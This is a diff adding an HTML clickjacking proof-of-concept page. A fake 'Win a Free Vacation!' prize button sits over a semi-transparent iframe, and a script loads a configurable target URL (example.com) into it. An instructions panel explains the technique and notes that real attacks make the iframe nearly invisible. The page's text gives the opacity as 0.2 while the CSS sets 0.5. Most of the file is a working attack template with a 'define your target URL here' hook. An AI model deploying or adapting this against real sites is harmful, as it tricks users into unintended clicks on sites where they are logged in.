@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Clickjacking PoC - Enhanced Demo</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            background: linear-gradient(to right, #ece9e6, #ffffff);
+            color: #333;
+            padding: 20px;
+        }
+
+        .main-container {
+            position: relative;
+            /* Essential for positioning the iframe */
+            width: 800px;
+            /* Adjust as needed */
+            height: 600px;
+            /* Adjust as needed */
+            border: 5px dashed #ccc;
+            background-color: #f9f9f9;
+            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.2);
+            border-radius: 10px;
+            overflow: hidden;
+            /* Important to keep iframe within bounds */
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            text-align: center;
+        }
+
+        h1 {
+            color: #2c3e50;
+            margin-bottom: 15px;
+        }
+
+        p {
+            margin-bottom: 25px;
+            line-height: 1.6;
+        }
+
+        .visible-button {
+            background-color: #e74c3c;
+            /* Red color to attract attention */
+            color: white;
+            padding: 18px 40px;
+            border: none;
+            border-radius: 8px;
+            font-size: 20px;
+            font-weight: bold;
+            cursor: pointer;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            transition: background-color 0.3s ease, transform 0.2s ease;
+            z-index: 2;
+            /* Make sure it's visually above the iframe */
+            position: relative;
+            /* To ensure z-index works relative to iframe */
+        }
+
+        .visible-button:hover {
+            background-color: #c0392b;
+            transform: translateY(-2px);
+        }
+
+        /* The malicious iframe */
+        .target-frame {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            /* Key for demonstration: semi-transparent so you see the underlying site */
+            opacity: 0.5;
+            /* You can adjust this to see more or less of the hidden site */
+            z-index: 1;
+            /* Place it below the visible button but above the background */
+            border: none;
+            /* Adjust this to move the content of the iframe if needed */
+            /* transform: translateY(-50px); Adjust vertical position */
+            /* transform: translateX(-50px); Adjust horizontal position */
+        }
+
+        .instructions {
+            margin-top: 40px;
+            background-color: #f2f2f2;
+            padding: 20px;
+            border-radius: 8px;
+            border: 1px solid #ddd;
+            font-size: 0.9em;
+            width: 800px;
+            max-width: 90%;
+            box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.1);
+            text-align: left;
+        }
+
+        .instructions strong {
+            color: #34495e;
+        }
+
+        .instructions ol {
+            margin-top: 10px;
+            padding-left: 20px;
+        }
+
+        .instructions li {
+            margin-bottom: 8px;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="main-container">
+        <h1>🎉 Win a Free Vacation! 🎉</h1>
+        <p>Click the button below to claim your incredible prize!</p>
+
+        <button class="visible-button">CLAIM YOUR PRIZE NOW!</button>
+
+        <iframe class="target-frame" id="maliciousIframe" src=""></iframe>
+    </div>
+
+    <div class="instructions">
+        <h3>How This Clickjacking PoC Works:</h3>
+        <ol>
+            <li>The large box contains a **visible button** ("CLAIM YOUR PRIZE NOW!").</li>
+            <li>**Behind** this visible button, there's an &lt;iframe&gt; loading the <span id="targetUrlText1"></span>
+                (or your chosen target URL).</li>
+            <li>The &lt;iframe&gt; is made **semi-transparent** (`opacity: 0.2`) so you can see it working. In a real
+                attack, it would be almost completely invisible (`opacity: 0.0001`).</li>
+            <li>The &lt;iframe&gt; is positioned directly over the area where the user is encouraged to click.</li>
+            <li>When you click the visible "CLAIM YOUR PRIZE NOW!" button, your click **actually registers on the
+                element from <span id="targetUrlText2"></span>** that is directly underneath it within the
+                &lt;iframe&gt;.</li>
+            <li>**To test:** Try clicking around the "CLAIM YOUR PRIZE NOW!" button. You'll notice your clicks are
+                interacting with the <span id="targetUrlText3"></span> page behind</li>
+        </ol>
+    </div>
+
+    <script>
+        // DEFINE YOUR TARGET URL HERE
+        const targetUrl = "https://example.com/";
+
+        document.addEventListener('DOMContentLoaded', (event) => {
+            // Set the iframe's src attribute
+            const iframe = document.getElementById('maliciousIframe');
+            if (iframe) {
+                iframe.src = targetUrl;
+            }
+
+            // Update the text content in the instructions list
+            const textElement1 = document.getElementById('targetUrlText1');
+            if (textElement1) {
+                textElement1.textContent = targetUrl;
+            }
+
+            const textElement2 = document.getElementById('targetUrlText2');
+            if (textElement2) {
+                textElement2.textContent = targetUrl;
+            }
+
+            const textElement3 = document.getElementById('targetUrlText3');
+            if (textElement3) {
+                textElement3.textContent = targetUrl;
+            }
+        });
+    </script>
+
+</body>
+
+</html>
